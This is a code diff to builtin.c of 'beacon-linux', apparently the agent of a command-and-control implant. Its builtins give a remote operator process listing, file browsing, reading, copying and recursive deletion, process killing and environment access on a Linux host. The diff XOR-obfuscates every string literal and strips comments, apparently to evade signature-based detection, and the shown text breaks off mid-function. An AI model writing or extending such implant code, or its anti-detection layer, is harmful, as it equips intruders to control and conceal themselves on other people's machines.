@@ -1,18 +1,10 @@
 /*
  * builtin.c — native builtins for beacon-linux (no /bin/sh spawning)
+ *
+ * All strings XOR-obfuscated via xor_dec() from util/obf.h + obf_strings.h.
  */
 
 #define _GNU_SOURCE
-
-/*
- *
- * All 21 builtins + dispatch.  Each builtin writes output into the caller-
- * supplied out_buf and returns the number of bytes written (not including the
- * terminating NUL).
- *
- * String comparisons currently use strcmp/strncmp.
- * XOR: replace with xor_eq / xor_prefix once ENC_CMD_* constants exist.
- */
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -40,6 +32,8 @@
 
 #include "builtin.h"
 #include "beacon.h"
+#include "util/obf.h"
+#include "obf_strings.h"
 
 /* -------------------------------------------------------------------------
  * Internal helpers
@@ -90,6 +84,22 @@ static int read_small_file(const char *path, char *dst, int max) {
     /* strip trailing newline */
     if (n > 0 && dst[n - 1] == '\n') dst[n - 1] = '\0';
     return (int)n;
+}
+
+/* XOR-decode + strcmp helper */
+static int xor_eq(const char *str, const unsigned char *enc, int enc_len) {
+    char tmp[256];
+    if (enc_len >= (int)sizeof(tmp)) return 0;
+    xor_dec(tmp, enc, (size_t)enc_len);
+    return strcmp(str, tmp) == 0;
+}
+
+/* XOR-decode + strncmp helper for prefix matching */
+static int xor_prefix(const char *str, const unsigned char *enc, int enc_len) {
+    char tmp[256];
+    if (enc_len >= (int)sizeof(tmp)) return 0;
+    xor_dec(tmp, enc, (size_t)enc_len);
+    return strncmp(str, tmp, (size_t)enc_len) == 0;
 }
 
 /* -------------------------------------------------------------------------
@@ -154,8 +164,13 @@ static int builtin_hostname(char *buf, int buf_size) {
     struct utsname uts;
     uname(&uts);
 
-    pos = out_append(buf, buf_size, pos, "hostname: %s\n", hname);
-    pos = out_append(buf, buf_size, pos, "kernel: %s %s %s\n",
+    char fmt1[ENC_LX_HOSTNAME_LABEL_LEN + 1];
+    xor_dec(fmt1, ENC_LX_HOSTNAME_LABEL, ENC_LX_HOSTNAME_LABEL_LEN);
+    pos = out_append(buf, buf_size, pos, fmt1, hname);
+
+    char fmt2[ENC_LX_KERNEL_LABEL_LEN + 1];
+    xor_dec(fmt2, ENC_LX_KERNEL_LABEL, ENC_LX_KERNEL_LABEL_LEN);
+    pos = out_append(buf, buf_size, pos, fmt2,
                      uts.sysname, uts.release, uts.machine);
     return pos;
 }
@@ -165,8 +180,11 @@ static int builtin_hostname(char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_pwd(char *buf, int buf_size) {
     char cwd[4096];
-    if (getcwd(cwd, sizeof(cwd)) == NULL)
-        return out_append(buf, buf_size, 0, "getcwd: %s\n", strerror(errno));
+    if (getcwd(cwd, sizeof(cwd)) == NULL) {
+        char fmt[ENC_LX_GETCWD_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_GETCWD_ERR, ENC_LX_GETCWD_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
+    }
     return out_append(buf, buf_size, 0, "%s\n", cwd);
 }
 
@@ -176,11 +194,16 @@ static int builtin_pwd(char *buf, int buf_size) {
 static int builtin_cd(const char *args, char *buf, int buf_size) {
     const char *target = ltrim(args);
     if (*target == '\0') {
-        target = getenv("HOME");
+        char home_var[ENC_LX_ENV_HOME_LEN + 1];
+        xor_dec(home_var, ENC_LX_ENV_HOME, ENC_LX_ENV_HOME_LEN);
+        target = getenv(home_var);
         if (!target || *target == '\0') target = "/";
     }
-    if (chdir(target) != 0)
-        return out_append(buf, buf_size, 0, "cd: %s: %s\n", target, strerror(errno));
+    if (chdir(target) != 0) {
+        char fmt[ENC_LX_CD_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CD_ERR, ENC_LX_CD_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, target, strerror(errno));
+    }
     char cwd[4096];
     if (getcwd(cwd, sizeof(cwd)) == NULL)
         return out_append(buf, buf_size, 0, "%s\n", target);
@@ -204,11 +227,17 @@ static int builtin_env(char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_getenv(const char *args, char *buf, int buf_size) {
     const char *var = ltrim(args);
-    if (*var == '\0')
-        return out_append(buf, buf_size, 0, "usage: getenv <VAR>\n");
+    if (*var == '\0') {
+        char fmt[ENC_LX_USAGE_GETENV_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_GETENV, ENC_LX_USAGE_GETENV_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
     const char *val = getenv(var);
-    if (!val)
-        return out_append(buf, buf_size, 0, "%s: not set\n", var);
+    if (!val) {
+        char fmt[ENC_LX_NOT_SET_LEN + 1];
+        xor_dec(fmt, ENC_LX_NOT_SET, ENC_LX_NOT_SET_LEN);
+        return out_append(buf, buf_size, 0, fmt, var);
+    }
     return out_append(buf, buf_size, 0, "%s\n", val);
 }
 
@@ -217,11 +246,19 @@ static int builtin_getenv(const char *args, char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_mkdir(const char *args, char *buf, int buf_size) {
     const char *path = ltrim(args);
-    if (*path == '\0')
-        return out_append(buf, buf_size, 0, "usage: mkdir <path>\n");
-    if (mkdir(path, 0755) != 0)
-        return out_append(buf, buf_size, 0, "mkdir: %s: %s\n", path, strerror(errno));
-    return out_append(buf, buf_size, 0, "created: %s\n", path);
+    if (*path == '\0') {
+        char fmt[ENC_LX_USAGE_MKDIR_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_MKDIR, ENC_LX_USAGE_MKDIR_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
+    if (mkdir(path, 0755) != 0) {
+        char fmt[ENC_LX_MKDIR_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_MKDIR_ERR, ENC_LX_MKDIR_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, path, strerror(errno));
+    }
+    char fmt[ENC_LX_CREATED_LEN + 1];
+    xor_dec(fmt, ENC_LX_CREATED, ENC_LX_CREATED_LEN);
+    return out_append(buf, buf_size, 0, fmt, path);
 }
 
 /* -------------------------------------------------------------------------
@@ -229,8 +266,11 @@ static int builtin_mkdir(const char *args, char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_chmod(const char *args, char *buf, int buf_size) {
     const char *p = ltrim(args);
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0, "usage: chmod <mode> <path>\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_CHMOD_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_CHMOD, ENC_LX_USAGE_CHMOD_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     char mode_str[16] = {0};
     int i = 0;
@@ -238,17 +278,28 @@ static int builtin_chmod(const char *args, char *buf, int buf_size) {
     mode_str[i] = '\0';
 
     p = ltrim(p);
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0, "usage: chmod <mode> <path>\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_CHMOD_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_CHMOD, ENC_LX_USAGE_CHMOD_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     char *end = NULL;
     long mode_val = strtol(mode_str, &end, 8);
-    if (!end || *end != '\0' || mode_val < 0 || mode_val > 07777)
-        return out_append(buf, buf_size, 0, "chmod: invalid mode '%s'\n", mode_str);
+    if (!end || *end != '\0' || mode_val < 0 || mode_val > 07777) {
+        char fmt[ENC_LX_CHMOD_INVAL_LEN + 1];
+        xor_dec(fmt, ENC_LX_CHMOD_INVAL, ENC_LX_CHMOD_INVAL_LEN);
+        return out_append(buf, buf_size, 0, fmt, mode_str);
+    }
 
-    if (chmod(p, (mode_t)mode_val) != 0)
-        return out_append(buf, buf_size, 0, "chmod: %s: %s\n", p, strerror(errno));
-    return out_append(buf, buf_size, 0, "chmod: %s -> 0%lo\n", p, mode_val);
+    if (chmod(p, (mode_t)mode_val) != 0) {
+        char fmt[ENC_LX_CHMOD_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CHMOD_ERR, ENC_LX_CHMOD_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, p, strerror(errno));
+    }
+    char fmt[ENC_LX_CHMOD_OK_LEN + 1];
+    xor_dec(fmt, ENC_LX_CHMOD_OK, ENC_LX_CHMOD_OK_LEN);
+    return out_append(buf, buf_size, 0, fmt, p, mode_val);
 }
 
 /* -------------------------------------------------------------------------
@@ -266,28 +317,47 @@ static int builtin_kill_cmd(const char *args, char *buf, int buf_size) {
         sig_str[i] = '\0';
         char *end = NULL;
         long sv = strtol(sig_str, &end, 10);
-        if (!end || *end != '\0')
-            return out_append(buf, buf_size, 0, "kill: invalid signal '%s'\n", sig_str);
+        if (!end || *end != '\0') {
+            char fmt[ENC_LX_KILL_INVAL_SIG_LEN + 1];
+            xor_dec(fmt, ENC_LX_KILL_INVAL_SIG, ENC_LX_KILL_INVAL_SIG_LEN);
+            return out_append(buf, buf_size, 0, fmt, sig_str);
+        }
         sig = (int)sv;
         p = ltrim(p);
     }
 
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0, "usage: kill [-<sig>] <pid>\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_KILL_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_KILL, ENC_LX_USAGE_KILL_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     char *end = NULL;
     long pid_val = strtol(p, &end, 10);
-    if (!end || (*end != '\0' && *end != '\n'))
-        return out_append(buf, buf_size, 0, "kill: invalid pid '%s'\n", p);
+    if (!end || (*end != '\0' && *end != '\n')) {
+        char fmt[ENC_LX_KILL_INVAL_PID_LEN + 1];
+        xor_dec(fmt, ENC_LX_KILL_INVAL_PID, ENC_LX_KILL_INVAL_PID_LEN);
+        return out_append(buf, buf_size, 0, fmt, p);
+    }
 
     if (kill((pid_t)pid_val, sig) != 0) {
-        if (errno == EPERM)
-            return out_append(buf, buf_size, 0, "kill: %d: permission denied\n", (int)pid_val);
-        if (errno == ESRCH)
-            return out_append(buf, buf_size, 0, "kill: %d: no such process\n", (int)pid_val);
-        return out_append(buf, buf_size, 0, "kill: %d: %s\n", (int)pid_val, strerror(errno));
+        if (errno == EPERM) {
+            char fmt[ENC_LX_KILL_PERM_LEN + 1];
+            xor_dec(fmt, ENC_LX_KILL_PERM, ENC_LX_KILL_PERM_LEN);
+            return out_append(buf, buf_size, 0, fmt, (int)pid_val);
+        }
+        if (errno == ESRCH) {
+            char fmt[ENC_LX_KILL_NOSUCH_LEN + 1];
+            xor_dec(fmt, ENC_LX_KILL_NOSUCH, ENC_LX_KILL_NOSUCH_LEN);
+            return out_append(buf, buf_size, 0, fmt, (int)pid_val);
+        }
+        char fmt[ENC_LX_KILL_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_KILL_ERR, ENC_LX_KILL_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, (int)pid_val, strerror(errno));
     }
-    return out_append(buf, buf_size, 0, "killed PID %d with signal %d\n", (int)pid_val, sig);
+    char fmt[ENC_LX_KILLED_LEN + 1];
+    xor_dec(fmt, ENC_LX_KILLED, ENC_LX_KILLED_LEN);
+    return out_append(buf, buf_size, 0, fmt, (int)pid_val, sig);
 }
 
 /* -------------------------------------------------------------------------
@@ -313,13 +383,33 @@ static int builtin_ps(char *buf, int buf_size) {
     int count = 0;
     int cap = 256;
     ProcEntry *procs = malloc((size_t)cap * sizeof(ProcEntry));
-    if (!procs) return out_append(buf, buf_size, 0, "ps: malloc failed\n");
+    if (!procs) {
+        char fmt[ENC_LX_PS_MALLOC_LEN + 1];
+        xor_dec(fmt, ENC_LX_PS_MALLOC, ENC_LX_PS_MALLOC_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
-    DIR *proc_dir = opendir("/proc");
+    char proc_path[ENC_LX_PROC_LEN + 1];
+    xor_dec(proc_path, ENC_LX_PROC, ENC_LX_PROC_LEN);
+
+    DIR *proc_dir = opendir(proc_path);
     if (!proc_dir) {
         free(procs);
-        return out_append(buf, buf_size, 0, "ps: cannot open /proc: %s\n", strerror(errno));
+        char fmt[ENC_LX_PS_OPENPROC_LEN + 1];
+        xor_dec(fmt, ENC_LX_PS_OPENPROC, ENC_LX_PS_OPENPROC_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
     }
+
+    char stat_fmt[ENC_LX_PROC_PID_STAT_LEN + 1];
+    xor_dec(stat_fmt, ENC_LX_PROC_PID_STAT, ENC_LX_PROC_PID_STAT_LEN);
+    char status_fmt[ENC_LX_PROC_PID_STATUS_LEN + 1];
+    xor_dec(status_fmt, ENC_LX_PROC_PID_STATUS, ENC_LX_PROC_PID_STATUS_LEN);
+    char cmdline_fmt[ENC_LX_PROC_PID_CMDLINE_LEN + 1];
+    xor_dec(cmdline_fmt, ENC_LX_PROC_PID_CMDLINE, ENC_LX_PROC_PID_CMDLINE_LEN);
+    char uid_nl[ENC_LX_UID_NL_LEN + 1];
+    xor_dec(uid_nl, ENC_LX_UID_NL, ENC_LX_UID_NL_LEN);
+    char uid_bare[ENC_LX_UID_BARE_LEN + 1];
+    xor_dec(uid_bare, ENC_LX_UID_BARE, ENC_LX_UID_BARE_LEN);
 
     struct dirent *de;
     while ((de = readdir(proc_dir)) != NULL) {
@@ -333,12 +423,10 @@ static int builtin_ps(char *buf, int buf_size) {
         memset(&e, 0, sizeof(e));
         e.pid = (int)pid_num;
 
-        /* /proc/<pid>/stat */
         char path[128];
-        snprintf(path, sizeof(path), "/proc/%d/stat", e.pid);
+        snprintf(path, sizeof(path), stat_fmt, e.pid);
         char stat_buf[512];
         if (read_small_file(path, stat_buf, sizeof(stat_buf)) > 0) {
-            /* format: pid (comm) state ppid ... */
             char *lp = strchr(stat_buf, '(');
             char *rp = strrchr(stat_buf, ')');
             if (lp && rp && rp > lp) {
@@ -346,15 +434,13 @@ static int builtin_ps(char *buf, int buf_size) {
                 if (clen >= (int)sizeof(e.comm)) clen = (int)sizeof(e.comm) - 1;
                 memcpy(e.comm, lp + 1, (size_t)clen);
                 e.comm[clen] = '\0';
-                /* after ')': ' state ppid ...' */
                 if (*(rp + 1) == ' ') {
                     sscanf(rp + 2, "%c %d", &e.state, &e.ppid);
                 }
             }
         }
 
-        /* /proc/<pid>/status — grab real uid */
-        snprintf(path, sizeof(path), "/proc/%d/status", e.pid);
+        snprintf(path, sizeof(path), status_fmt, e.pid);
         {
             int fd = open(path, O_RDONLY);
             if (fd >= 0) {
@@ -363,10 +449,9 @@ static int builtin_ps(char *buf, int buf_size) {
                 close(fd);
                 if (n > 0) {
                     sbuf[n] = '\0';
-                    char *uid_line = strstr(sbuf, "\nUid:");
-                    if (!uid_line) uid_line = strstr(sbuf, "Uid:");
+                    char *uid_line = strstr(sbuf, uid_nl);
+                    if (!uid_line) uid_line = strstr(sbuf, uid_bare);
                     if (uid_line) {
-                        /* skip "Uid:\t" */
                         uid_line = strchr(uid_line, ':');
                         if (uid_line) {
                             uid_line++;
@@ -385,8 +470,7 @@ static int builtin_ps(char *buf, int buf_size) {
         }
         if (e.user[0] == '\0') strncpy(e.user, "?", sizeof(e.user) - 1);
 
-        /* /proc/<pid>/cmdline — replace NULs with spaces, truncate at 60 */
-        snprintf(path, sizeof(path), "/proc/%d/cmdline", e.pid);
+        snprintf(path, sizeof(path), cmdline_fmt, e.pid);
         {
             int fd = open(path, O_RDONLY);
             if (fd >= 0) {
@@ -419,8 +503,19 @@ static int builtin_ps(char *buf, int buf_size) {
 
     qsort(procs, (size_t)count, sizeof(ProcEntry), proc_cmp);
 
+    char h_pid[ENC_LX_PS_HDR_PID_LEN + 1];
+    xor_dec(h_pid, ENC_LX_PS_HDR_PID, ENC_LX_PS_HDR_PID_LEN);
+    char h_ppid[ENC_LX_PS_HDR_PPID_LEN + 1];
+    xor_dec(h_ppid, ENC_LX_PS_HDR_PPID, ENC_LX_PS_HDR_PPID_LEN);
+    char h_user[ENC_LX_PS_HDR_USER_LEN + 1];
+    xor_dec(h_user, ENC_LX_PS_HDR_USER, ENC_LX_PS_HDR_USER_LEN);
+    char h_state[ENC_LX_PS_HDR_STATE_LEN + 1];
+    xor_dec(h_state, ENC_LX_PS_HDR_STATE, ENC_LX_PS_HDR_STATE_LEN);
+    char h_cmd[ENC_LX_PS_HDR_CMD_LEN + 1];
+    xor_dec(h_cmd, ENC_LX_PS_HDR_CMD, ENC_LX_PS_HDR_CMD_LEN);
+
     pos = out_append(buf, buf_size, pos,
-        "%6s  %6s  %-14s %-6s %s\n", "PID", "PPID", "USER", "STATE", "COMMAND");
+        "%6s  %6s  %-14s %-6s %s\n", h_pid, h_ppid, h_user, h_state, h_cmd);
     for (int i = 0; i < count; i++) {
         char st[2] = { procs[i].state, '\0' };
         pos = out_append(buf, buf_size, pos,
@@ -440,20 +535,27 @@ static int builtin_ls(const char *args, char *buf, int buf_size) {
 
     const char *target = ltrim(args);
     if (*target == '\0') {
-        if (getcwd(path, sizeof(path)) == NULL)
-            return out_append(buf, buf_size, 0, "ls: getcwd failed: %s\n", strerror(errno));
+        if (getcwd(path, sizeof(path)) == NULL) {
+            char fmt[ENC_LX_LS_GETCWD_LEN + 1];
+            xor_dec(fmt, ENC_LX_LS_GETCWD, ENC_LX_LS_GETCWD_LEN);
+            return out_append(buf, buf_size, 0, fmt, strerror(errno));
+        }
     } else {
         strncpy(path, target, sizeof(path) - 1);
         path[sizeof(path) - 1] = '\0';
     }
 
     DIR *d = opendir(path);
-    if (!d)
-        return out_append(buf, buf_size, 0, "ls: %s: %s\n", path, strerror(errno));
+    if (!d) {
+        char fmt[ENC_LX_LS_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_LS_ERR, ENC_LX_LS_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, path, strerror(errno));
+    }
 
     struct dirent *de;
     while ((de = readdir(d)) != NULL) {
-        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) continue;
+        if (de->d_name[0] == '.' && (de->d_name[1] == '\0' ||
+            (de->d_name[1] == '.' && de->d_name[2] == '\0'))) continue;
 
         char full[4096 + 256 + 2];
         snprintf(full, sizeof(full), "%s/%s", path, de->d_name);
@@ -540,7 +642,7 @@ static int builtin_filebrowser(const char *args, char *buf, int buf_size) {
     if (*target == '\0') {
         if (getcwd(path, sizeof(path)) == NULL)
             return out_append(buf, buf_size, 0,
-                "[{\"error\":\"getcwd failed: %s\"}]", strerror(errno));
+                "[{\"error\":\"%s\"}]", strerror(errno));
     } else {
         strncpy(path, target, sizeof(path) - 1);
         path[sizeof(path) - 1] = '\0';
@@ -549,14 +651,31 @@ static int builtin_filebrowser(const char *args, char *buf, int buf_size) {
     DIR *d = opendir(path);
     if (!d)
         return out_append(buf, buf_size, 0,
-            "[{\"error\":\"%s: %s\"}]", path, strerror(errno));
+            "[{\"error\":\"%s\"}]", strerror(errno));
+
+    /* decode type strings once */
+    char ts_dir[ENC_LX_FB_TYPE_DIR_LEN + 1];
+    xor_dec(ts_dir, ENC_LX_FB_TYPE_DIR, ENC_LX_FB_TYPE_DIR_LEN);
+    char ts_link[ENC_LX_FB_TYPE_LINK_LEN + 1];
+    xor_dec(ts_link, ENC_LX_FB_TYPE_LINK, ENC_LX_FB_TYPE_LINK_LEN);
+    char ts_char[ENC_LX_FB_TYPE_CHAR_LEN + 1];
+    xor_dec(ts_char, ENC_LX_FB_TYPE_CHAR, ENC_LX_FB_TYPE_CHAR_LEN);
+    char ts_block[ENC_LX_FB_TYPE_BLOCK_LEN + 1];
+    xor_dec(ts_block, ENC_LX_FB_TYPE_BLOCK, ENC_LX_FB_TYPE_BLOCK_LEN);
+    char ts_pipe[ENC_LX_FB_TYPE_PIPE_LEN + 1];
+    xor_dec(ts_pipe, ENC_LX_FB_TYPE_PIPE, ENC_LX_FB_TYPE_PIPE_LEN);
+    char ts_sock[ENC_LX_FB_TYPE_SOCKET_LEN + 1];
+    xor_dec(ts_sock, ENC_LX_FB_TYPE_SOCKET, ENC_LX_FB_TYPE_SOCKET_LEN);
+    char ts_file[ENC_LX_FB_TYPE_FILE_LEN + 1];
+    xor_dec(ts_file, ENC_LX_FB_TYPE_FILE, ENC_LX_FB_TYPE_FILE_LEN);
 
     pos = out_append(buf, buf_size, pos, "[");
     int first = 1;
     struct dirent *de;
 
     while ((de = readdir(d)) != NULL) {
-        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
+        if (de->d_name[0] == '.' && (de->d_name[1] == '\0' ||
+            (de->d_name[1] == '.' && de->d_name[2] == '\0')))
             continue;
 
         char full[4096 + 256 + 2];
@@ -569,13 +688,13 @@ static int builtin_filebrowser(const char *args, char *buf, int buf_size) {
         const char *type_str;
         char type_c;
         switch (st.st_mode & S_IFMT) {
-            case S_IFDIR:  type_str = "dir";    type_c = 'd'; break;
-            case S_IFLNK:  type_str = "link";   type_c = 'l'; break;
-            case S_IFCHR:  type_str = "char";   type_c = 'c'; break;
-            case S_IFBLK:  type_str = "block";  type_c = 'b'; break;
-            case S_IFIFO:  type_str = "pipe";   type_c = 'p'; break;
-            case S_IFSOCK: type_str = "socket"; type_c = 's'; break;
-            default:       type_str = "file";   type_c = '-'; break;
+            case S_IFDIR:  type_str = ts_dir;    type_c = 'd'; break;
+            case S_IFLNK:  type_str = ts_link;   type_c = 'l'; break;
+            case S_IFCHR:  type_str = ts_char;   type_c = 'c'; break;
+            case S_IFBLK:  type_str = ts_block;  type_c = 'b'; break;
+            case S_IFIFO:  type_str = ts_pipe;   type_c = 'p'; break;
+            case S_IFSOCK: type_str = ts_sock;   type_c = 's'; break;
+            default:       type_str = ts_file;   type_c = '-'; break;
         }
 
         char perm[10];
@@ -629,17 +748,25 @@ static int builtin_filebrowser(const char *args, char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_cat(const char *args, char *buf, int buf_size) {
     const char *path = ltrim(args);
-    if (*path == '\0')
-        return out_append(buf, buf_size, 0, "usage: cat <file>\n");
+    if (*path == '\0') {
+        char fmt[ENC_LX_USAGE_CAT_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_CAT, ENC_LX_USAGE_CAT_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     int fd = open(path, O_RDONLY);
-    if (fd < 0)
-        return out_append(buf, buf_size, 0, "cat: %s: %s\n", path, strerror(errno));
+    if (fd < 0) {
+        char fmt[ENC_LX_CAT_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CAT_ERR, ENC_LX_CAT_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, path, strerror(errno));
+    }
 
     struct stat st;
     if (fstat(fd, &st) == 0 && st.st_size > 1048576) {
         close(fd);
-        return out_append(buf, buf_size, 0, "cat: file too large (max 1MB)\n");
+        char fmt[ENC_LX_CAT_TOOLARGE_LEN + 1];
+        xor_dec(fmt, ENC_LX_CAT_TOOLARGE, ENC_LX_CAT_TOOLARGE_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
     }
 
     int pos = 0;
@@ -661,7 +788,6 @@ static int builtin_cat(const char *args, char *buf, int buf_size) {
  * 13. builtin_rm
  * ---------------------------------------------------------------------- */
 
-/* nftw callback state — single global is fine since operations are sequential */
 static int g_rm_errors = 0;
 
 static int rm_callback(const char *fpath, const struct stat *sb,
@@ -673,42 +799,66 @@ static int rm_callback(const char *fpath, const struct stat *sb,
     else
         r = unlink(fpath);
     if (r != 0) g_rm_errors++;
-    return 0; /* continue */
+    return 0;
 }
 
 static int builtin_rm(const char *args, char *buf, int buf_size) {
     const char *p = ltrim(args);
     int recursive = 0;
 
-    if (strncmp(p, "-rf ", 4) == 0 || strncmp(p, "-fr ", 4) == 0) {
+    char rf_sp[ENC_LX_RM_RF_SP_LEN + 1]; xor_dec(rf_sp, ENC_LX_RM_RF_SP, ENC_LX_RM_RF_SP_LEN);
+    char fr_sp[ENC_LX_RM_FR_SP_LEN + 1]; xor_dec(fr_sp, ENC_LX_RM_FR_SP, ENC_LX_RM_FR_SP_LEN);
+    char r_sp[ENC_LX_RM_R_SP_LEN + 1];   xor_dec(r_sp, ENC_LX_RM_R_SP, ENC_LX_RM_R_SP_LEN);
+    char r_flag[ENC_LX_RM_R_LEN + 1];    xor_dec(r_flag, ENC_LX_RM_R, ENC_LX_RM_R_LEN);
+    char rf_flag[ENC_LX_RM_RF_LEN + 1];  xor_dec(rf_flag, ENC_LX_RM_RF, ENC_LX_RM_RF_LEN);
+    char fr_flag[ENC_LX_RM_FR_LEN + 1];  xor_dec(fr_flag, ENC_LX_RM_FR, ENC_LX_RM_FR_LEN);
+
+    if (strncmp(p, rf_sp, 4) == 0 || strncmp(p, fr_sp, 4) == 0) {
         recursive = 1; p = ltrim(p + 4);
-    } else if (strncmp(p, "-r ", 3) == 0) {
+    } else if (strncmp(p, r_sp, 3) == 0) {
         recursive = 1; p = ltrim(p + 3);
-    } else if (strcmp(p, "-r") == 0 || strcmp(p, "-rf") == 0 || strcmp(p, "-fr") == 0) {
-        return out_append(buf, buf_size, 0, "usage: rm [-r|-rf] <path>\n");
+    } else if (strcmp(p, r_flag) == 0 || strcmp(p, rf_flag) == 0 || strcmp(p, fr_flag) == 0) {
+        char fmt[ENC_LX_USAGE_RM_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_RM, ENC_LX_USAGE_RM_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
     }
 
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0, "usage: rm [-r|-rf] <path>\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_RM_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_RM, ENC_LX_USAGE_RM_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     struct stat st;
-    if (lstat(p, &st) != 0)
-        return out_append(buf, buf_size, 0, "rm: %s: %s\n", p, strerror(errno));
+    if (lstat(p, &st) != 0) {
+        char fmt[ENC_LX_RM_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_RM_ERR, ENC_LX_RM_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, p, strerror(errno));
+    }
 
     if (S_ISDIR(st.st_mode)) {
-        if (!recursive)
-            return out_append(buf, buf_size, 0,
-                              "rm: %s: is a directory (use -r)\n", p);
+        if (!recursive) {
+            char fmt[ENC_LX_RM_ISDIR_LEN + 1];
+            xor_dec(fmt, ENC_LX_RM_ISDIR, ENC_LX_RM_ISDIR_LEN);
+            return out_append(buf, buf_size, 0, fmt, p);
+        }
         g_rm_errors = 0;
         nftw(p, rm_callback, 64, FTW_DEPTH | FTW_PHYS);
-        if (g_rm_errors)
-            return out_append(buf, buf_size, 0,
-                              "rm: %s: some entries could not be removed\n", p);
+        if (g_rm_errors) {
+            char fmt[ENC_LX_RM_PARTIAL_LEN + 1];
+            xor_dec(fmt, ENC_LX_RM_PARTIAL, ENC_LX_RM_PARTIAL_LEN);
+            return out_append(buf, buf_size, 0, fmt, p);
+        }
     } else {
-        if (unlink(p) != 0)
-            return out_append(buf, buf_size, 0, "rm: %s: %s\n", p, strerror(errno));
+        if (unlink(p) != 0) {
+            char fmt[ENC_LX_RM_ERR_LEN + 1];
+            xor_dec(fmt, ENC_LX_RM_ERR, ENC_LX_RM_ERR_LEN);
+            return out_append(buf, buf_size, 0, fmt, p, strerror(errno));
+        }
     }
-    return out_append(buf, buf_size, 0, "removed: %s\n", p);
+    char fmt[ENC_LX_REMOVED_LEN + 1];
+    xor_dec(fmt, ENC_LX_REMOVED, ENC_LX_REMOVED_LEN);
+    return out_append(buf, buf_size, 0, fmt, p);
 }
 
 /* -------------------------------------------------------------------------
@@ -716,13 +866,18 @@ static int builtin_rm(const char *args, char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_cp(const char *args, char *buf, int buf_size) {
     const char *p = ltrim(args);
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0, "usage: cp <src> <dst>\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_CP_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_CP, ENC_LX_USAGE_CP_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
-    /* split on first space */
     const char *sp = strchr(p, ' ');
-    if (!sp)
-        return out_append(buf, buf_size, 0, "usage: cp <src> <dst>\n");
+    if (!sp) {
+        char fmt[ENC_LX_USAGE_CP_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_CP, ENC_LX_USAGE_CP_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     char src[4096], dst[4096];
     int slen = (int)(sp - p);
@@ -731,24 +886,30 @@ static int builtin_cp(const char *args, char *buf, int buf_size) {
 
     const char *dp = ltrim(sp);
     strncpy(dst, dp, sizeof(dst) - 1); dst[sizeof(dst) - 1] = '\0';
-    /* trim trailing newline */
     int dlen = (int)strlen(dst);
     if (dlen > 0 && dst[dlen - 1] == '\n') dst[--dlen] = '\0';
 
     int src_fd = open(src, O_RDONLY);
-    if (src_fd < 0)
-        return out_append(buf, buf_size, 0, "cp: %s: %s\n", src, strerror(errno));
+    if (src_fd < 0) {
+        char fmt[ENC_LX_CP_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CP_ERR, ENC_LX_CP_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, src, strerror(errno));
+    }
 
     struct stat st;
     if (fstat(src_fd, &st) != 0) {
         close(src_fd);
-        return out_append(buf, buf_size, 0, "cp: fstat(%s): %s\n", src, strerror(errno));
